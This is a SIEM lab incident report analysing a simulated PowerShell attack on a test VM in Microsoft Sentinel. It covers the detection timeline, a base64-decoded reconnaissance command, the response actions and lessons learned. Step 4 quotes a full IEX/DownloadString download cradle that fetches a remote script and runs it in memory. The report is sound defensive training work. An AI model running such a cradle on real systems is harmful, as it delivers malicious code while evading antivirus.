# Microsoft Sentinel SIEM Lab
**Sanskar Lohani** | April 2026

---

# IR-001 — Execution: PowerShell Suspicious Commands

| Field | Detail |
|-------|--------|
| **Incident ID** | 131 |
| **Detection Rule** | Execution - PowerShell Suspicious Commands |
| **MITRE Technique** | T1059.001, T1027 |
| **Technique Name** | Command and Scripting Interpreter: PowerShell / Obfuscated Files or Information |
| **MITRE Tactic** | Execution, Defense Evasion |
| **Severity** | High |
| **Status** | Active |
| **Time Generated (UTC)** | 2026-04-24 01:01:26 |
| **First Activity (UTC)** | 2026-04-24 00:51:24 |
| **Last Activity (UTC)** | 2026-04-24 00:51:41 |
| **Impacted Asset** | sentinel-vm |
| **Alerts Grouped** | 12 |

---

## Timeline

| Time (UTC) | Event |
|------------|-------|
| 00:51:24 | PowerShell Script Block Logging (EventID 4104) captured full simulation script content from `C:\Users\sentineladmin\Desktop\simulation.ps1` — ScriptBlock ID: c92e427b-a75a-401d-bc74-cb21d41c16f5 |
| 00:51:36 | Encoded PowerShell command executed via `-EncodedCommand` flag. Decoded content: `Write-Host 'Simulated malicious payload executed'; Get-Process; Get-LocalUser` |
| 00:51:41 | Download cradle simulated via IEX and Net.WebClient.DownloadString targeting `raw.githubusercontent.com` — ScriptBlock ID: 8327b0df-1c0f-4a4f-9c39-da8613be4d3a |
| 01:01:26 | Sentinel analytics rule fired — incident created, 12 alerts grouped |

---

## Investigation Steps

**Step 1 — Triage and scope confirmation**
Incident severity is High. Single asset impacted: sentinel-vm. 12 alerts grouped into one incident indicating sustained PowerShell activity over a short window, not a one-time event. No lateral movement detected — scope confirmed as isolated to sentinel-vm.

**Step 2 — Script block log analysis**
Queried `Event` table for EventID 4104 from sentinel-vm. Results confirmed full script content captured by PowerShell Script Block Logging, including encoded command execution and download cradle simulation. The `-EncodedCommand` flag is a known obfuscation technique used to hide payload content from basic log inspection.

**Step 3 — Base64 decode**
Encoded command decoded to: `Write-Host 'Simulated malicious payload executed'; Get-Process; Get-LocalUser` — enumerating running processes and local user accounts, consistent with post-exploitation reconnaissance activity.

**Step 4 — Download cradle investigation**
`IEX(New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com/test/test.ps1')` — a living-off-the-land technique for in-memory payload delivery that bypasses antivirus by never writing a file to disk.

**Step 5 — Cross-incident correlation**
Cross-referenced with Incident 130 (Suspicious DNS Query). DNS resolution for `raw.githubusercontent.com` confirmed in same session window, supporting a coordinated execution and C2 communication sequence. Azure Firewall logs (Incident 132) corroborate 56 outbound connection attempts from 10.0.0.5 during the same window.

---

## Findings

A PowerShell session on sentinel-vm executed an encoded command and simulated a download cradle targeting `raw.githubusercontent.com` between 00:51 and 00:52 UTC on 2026-04-24. Script Block Logging captured the full decoded payload, confirming obfuscation via base64 encoding. 12 script block events were generated, indicating sustained execution across multiple sub-expressions within the same session. DNS and firewall log correlation confirms this was the execution stage of a multi-stage attack sequence.

---

## Response Actions

1. Isolated incident and confirmed scope limited to sentinel-vm — no lateral movement detected
2. Reviewed full script block log content to decode and understand complete payload intent
3. Correlated with Incidents 130 and 132 to establish complete kill chain timeline
4. Automated playbook `sentinel-incident-response` executed — account disable attempted via Microsoft Graph API, enriched email sent, incident comment added
5. **Production response:** Isolate host immediately, revoke active PowerShell sessions, capture memory image for forensic analysis, rotate credentials for any accounts enumerated during `Get-LocalUser` execution

---

## Lessons Learned

PowerShell Script Block Logging (EventID 4104) is essential for detecting obfuscated execution. Without this policy enabled and collected via DCR, the encoded command would appear in logs only as `powershell.exe launched` with no visibility into what it ran. In production, constrained language mode and AMSI integration should supplement script block logging to prevent in-memory execution entirely rather than just detecting it after the fact.
